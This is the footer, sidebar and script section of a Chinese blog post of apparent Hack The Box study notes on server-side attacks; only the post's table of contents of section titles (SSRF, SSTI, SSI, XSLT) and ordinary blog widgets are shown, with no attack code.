</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2023/10/30/ServersideAttacksHTB/">http://mikannse.space/2023/10/30/ServersideAttacksHTB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">网安</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/04/IntroToAssemblyArchANDAssembDebugger/" title="IntroToAssemblyArchANDAssembDebuggerHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">IntroToAssemblyArchANDAssembDebuggerHTB</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/28/IntroductiontoBashScriptingHTB/" title="IntroductiontoBashScriptingHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">IntroductiontoBashScriptingHTB</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/" title="Cross-Site Scripting (XSS)HTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-17</div><div class="title">Cross-Site Scripting (XSS)HTB</div></div></a></div><div><a href="/2023/10/24/HackingWordPressHTB/" title="HackingWordPressHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-24</div><div class="title">HackingWordPressHTB</div></div></a></div><div><a href="/2023/11/07/IntroToAssemblyShellcodingANDSkill/" title="IntroToAssemblyShellcodingANDSkillHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-07</div><div class="title">IntroToAssemblyShellcodingANDSkillHTB</div></div></a></div><div><a href="/2023/10/28/IntroductiontoBashScriptingHTB/" title="IntroductiontoBashScriptingHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-28</div><div class="title">IntroductiontoBashScriptingHTB</div></div></a></div><div><a href="/2023/11/15/Information%20Gathering%20-%20Web%20EditionHTB/" title="Information Gathering - Web EditionHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-15</div><div class="title">Information Gathering - Web EditionHTB</div></div></a></div><div><a href="/2023/11/05/IntroToAssemblyBasicInstructionsANDFunctions/" title="IntroToAssemblyBasicInstructionsANDFunctionsHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-05</div><div class="title">IntroToAssemblyBasicInstructionsANDFunctionsHTB</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">308</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-to-Server-Side-Attacks"><span class="toc-number">1.</span> <span class="toc-text">Introduction to Server-Side Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Types-of-Server-Side-Attacks"><span class="toc-number">1.1.</span> <span class="toc-text">Types of Server-Side Attacks</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Abusing-Intermediary-Applications"><span class="toc-number">2.</span> <span class="toc-text">Abusing Intermediary Applications</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx-Reverse-Proxy-amp-AJP"><span class="toc-number">2.1.</span> <span class="toc-text">Nginx Reverse Proxy &amp; AJP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BDNginx%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">下载Nginx源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ajp%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91Nginx%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">使用ajp模块编译Nginx源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%90%91AJP%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.0.3.</span> <span class="toc-text">指向AJP端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Accessing-the-%E2%80%9Chidden%E2%80%9D-Tomcat-page"><span class="toc-number">2.1.0.4.</span> <span class="toc-text">Accessing the “hidden” Tomcat page</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">3.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-Exploitation-Example"><span class="toc-number">3.1.</span> <span class="toc-text">SSRF Exploitation Example</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap-Discovering-Open-Ports-Nmap"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">Nmap - Discovering Open Ports Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Interacting-with-the-Target"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">Curl - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Listener"><span class="toc-number">3.1.0.3.</span> <span class="toc-text">Netcat Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Testing-for-SSRF"><span class="toc-number">3.1.0.4.</span> <span class="toc-text">Curl - Testing for SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Listener-Confirming-SSRF"><span class="toc-number">3.1.0.5.</span> <span class="toc-text">Netcat Listener - Confirming SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Start-Python-HTTP-Server"><span class="toc-number">3.1.0.6.</span> <span class="toc-text">Start Python HTTP Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Start-FTP-Server"><span class="toc-number">3.1.0.7.</span> <span class="toc-text">Start FTP Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-Schema-%E9%80%9A%E8%BF%87%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A3%80%E7%B4%A2%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6-FTP%E6%9E%B6%E6%9E%84"><span class="toc-number">3.1.0.8.</span> <span class="toc-text">FTP Schema 通过目标应用程序检索远程文件- FTP架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A3%80%E7%B4%A2%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6-HTTP%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.0.9.</span> <span class="toc-text">通过目标应用程序检索远程文件- HTTP模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A3%80%E7%B4%A2%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E6%9E%B6%E6%9E%84"><span class="toc-number">3.1.0.10.</span> <span class="toc-text">通过目标应用程序检索本地文件-文件架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Generate-a-Wordlist"><span class="toc-number">3.1.0.11.</span> <span class="toc-text">Generate a Wordlist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Interacting-with-the-Target-1"><span class="toc-number">3.1.0.12.</span> <span class="toc-text">Curl - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Port-Fuzzing"><span class="toc-number">3.1.0.13.</span> <span class="toc-text">Port Fuzzing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target"><span class="toc-number">3.1.0.14.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-1"><span class="toc-number">3.1.0.15.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-2"><span class="toc-number">3.1.0.16.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-3"><span class="toc-number">3.1.0.17.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Port-Fuzzing-1"><span class="toc-number">3.1.0.18.</span> <span class="toc-text">Port Fuzzing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-4"><span class="toc-number">3.1.0.19.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-5"><span class="toc-number">3.1.0.20.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A3%80%E7%B4%A2%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E6%9E%B6%E6%9E%84-1"><span class="toc-number">3.1.0.21.</span> <span class="toc-text">通过目标应用程序检索本地文件-文件架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-6"><span class="toc-number">3.1.0.22.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Install-JQ-%E5%AE%89%E8%A3%85JQ"><span class="toc-number">3.1.0.23.</span> <span class="toc-text">Install JQ 安装JQ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Automate-executing-commands"><span class="toc-number">3.1.0.24.</span> <span class="toc-text">Automate executing commands</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-SSRF"><span class="toc-number">3.2.</span> <span class="toc-text">Blind SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-SSRF-Exploitation-Example"><span class="toc-number">3.3.</span> <span class="toc-text">Blind SSRF Exploitation Example</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Listener-1"><span class="toc-number">3.3.0.1.</span> <span class="toc-text">Netcat Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Listener-2"><span class="toc-number">3.3.0.2.</span> <span class="toc-text">Netcat Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64-Decoding"><span class="toc-number">3.3.0.3.</span> <span class="toc-text">Base64 Decoding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bash-Reverse-Shell"><span class="toc-number">3.3.0.4.</span> <span class="toc-text">Bash Reverse Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL-Encoded-Payload"><span class="toc-number">3.3.0.5.</span> <span class="toc-text">URL Encoded Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML-Payload"><span class="toc-number">3.3.0.6.</span> <span class="toc-text">HTML Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-Based-SSRF"><span class="toc-number">3.4.</span> <span class="toc-text">Time-Based SSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-Side-Includes-SSI-Injection"><span class="toc-number">4.</span> <span class="toc-text">Server-Side Includes (SSI) Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Side-Includes-Overview"><span class="toc-number">4.1.</span> <span class="toc-text">Server-Side Includes Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSI-Injection-Exploitation-Example"><span class="toc-number">4.2.</span> <span class="toc-text">SSI Injection Exploitation Example</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Date-%E6%97%A5%E6%9C%9F"><span class="toc-number">4.2.0.1.</span> <span class="toc-text">Date 日期</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#All-Variables"><span class="toc-number">4.2.0.2.</span> <span class="toc-text">All Variables</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-Shell"><span class="toc-number">4.2.0.3.</span> <span class="toc-text">Reverse Shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Edge-Side-Includes-ESI"><span class="toc-number">5.</span> <span class="toc-text">Edge-Side Includes (ESI)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ESI-Tags"><span class="toc-number">5.0.0.1.</span> <span class="toc-text">ESI Tags</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-Side-Template-Injections"><span class="toc-number">6.</span> <span class="toc-text">Server-Side Template Injections</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%A0%87%E8%AF%86"><span class="toc-number">6.1.</span> <span class="toc-text">SSTI标识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-Exploitation-Example-1"><span class="toc-number">6.2.</span> <span class="toc-text">SSTI Exploitation Example 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tplmap-py"><span class="toc-number">6.2.0.1.</span> <span class="toc-text">tplmap.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload"><span class="toc-number">6.2.0.2.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-cURL-%E4%B8%8E%E7%9B%AE%E6%A0%87%E4%BA%A4%E4%BA%92"><span class="toc-number">6.2.0.3.</span> <span class="toc-text">cURL - Interacting with the Target cURL -与目标交互</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tplmap-py-OS-Shell"><span class="toc-number">6.2.0.4.</span> <span class="toc-text">tplmap.py - OS Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-Exploitation-Example-2"><span class="toc-number">6.3.</span> <span class="toc-text">SSTI Exploitation Example 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-7"><span class="toc-number">6.3.0.1.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-8"><span class="toc-number">6.3.0.2.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-9"><span class="toc-number">6.3.0.3.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tplmap-py-1"><span class="toc-number">6.3.0.4.</span> <span class="toc-text">tplmap.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-Exploitation-Example-3"><span class="toc-number">6.4.</span> <span class="toc-text">SSTI Exploitation Example 3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-10"><span class="toc-number">6.4.0.1.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tplmap-py-2"><span class="toc-number">6.4.0.2.</span> <span class="toc-text">tplmap.py</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-Primer-for-SSTI"><span class="toc-number">6.4.1.</span> <span class="toc-text">Python Primer for SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-3-Interpreter"><span class="toc-number">6.4.1.1.</span> <span class="toc-text">Python 3 Interpreter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Interacting-with-the-Target-2"><span class="toc-number">6.4.1.2.</span> <span class="toc-text">Curl - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload-1"><span class="toc-number">6.4.1.3.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Interacting-with-the-Target-3"><span class="toc-number">6.4.1.4.</span> <span class="toc-text">Curl - Interacting with the Target</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-XSLT"><span class="toc-number">7.</span> <span class="toc-text">Attacking XSLT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Installation-of-required-packages"><span class="toc-number">7.0.0.1.</span> <span class="toc-text">Installation of required packages</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#catalogue-xml"><span class="toc-number">7.0.0.2.</span> <span class="toc-text">catalogue.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#transformation-xsl"><span class="toc-number">7.0.0.3.</span> <span class="toc-text">transformation.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transformation-through-the-terminal"><span class="toc-number">7.0.0.4.</span> <span class="toc-text">Transformation through the terminal</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#detection-xsl"><span class="toc-number">7.0.0.5.</span> <span class="toc-text">detection.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transformation-through-the-terminal-1"><span class="toc-number">7.0.0.6.</span> <span class="toc-text">Transformation through the terminal</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readfile-xsl"><span class="toc-number">7.0.0.7.</span> <span class="toc-text">readfile.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%88%E7%AB%AF%E8%BF%9B%E8%A1%8C%E8%BD%AC%E6%8D%A2"><span class="toc-number">7.0.0.8.</span> <span class="toc-text">通过终端进行转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssrf-xsl"><span class="toc-number">7.0.0.9.</span> <span class="toc-text">ssrf.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%88%E7%AB%AF%E8%BF%9B%E8%A1%8C%E8%BD%AC%E6%8D%A2-1"><span class="toc-number">7.0.0.10.</span> <span class="toc-text">通过终端进行转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fingerprinting-xsl"><span class="toc-number">7.0.0.11.</span> <span class="toc-text">fingerprinting.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%88%E7%AB%AF%E8%BF%9B%E8%A1%8C%E8%BD%AC%E6%8D%A2-2"><span class="toc-number">7.0.0.12.</span> <span class="toc-text">通过终端进行转换</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-Side-Attacks-Skills-Assessment"><span class="toc-number">8.</span> <span class="toc-text">Server-Side Attacks - Skills Assessment</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%83)%E4%B9%8BVulnHubDeathNote/" title="打靶记录(一六七)之VulnHubDeathNote">打靶记录(一六七)之VulnHubDeathNote</a><time datetime="2024-12-07T09:05:21.000Z" title="发表于 2024-12-07 17:05:21">2024-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E5%85%AD)%E4%B9%8BVulnHubVikings/" title="打靶记录(一六六)之VulnHubVikings">打靶记录(一六六)之VulnHubVikings</a><time datetime="2024-12-07T08:08:20.000Z" title="发表于 2024-12-07 16:08:20">2024-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/02/24-11%E6%9D%82%E8%B0%88/" title="24-11杂谈">24-11杂谈</a><time datetime="2024-12-02T06:12:07.000Z" title="发表于 2024-12-02 14:12:07">2024-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/02/2024%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWP(Web)/" title="2024福建省数据安全大赛WP(Web)">2024福建省数据安全大赛WP(Web)</a><time datetime="2024-12-01T16:11:19.000Z" title="发表于 2024-12-02 00:11:19">2024-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%94)%E4%B9%8BVulnTargetA/" title="打靶记录(一六五)之VulnTargetA">打靶记录(一六五)之VulnTargetA</a><time datetime="2024-11-20T15:31:29.000Z" title="发表于 2024-11-20 23:31:29">2024-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'http://mikannse.space/2023/10/30/ServersideAttacksHTB/'
    this.page.identifier = '/2023/10/30/ServersideAttacksHTB/'
    this.page.title = 'ServersideAttacksHTB'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
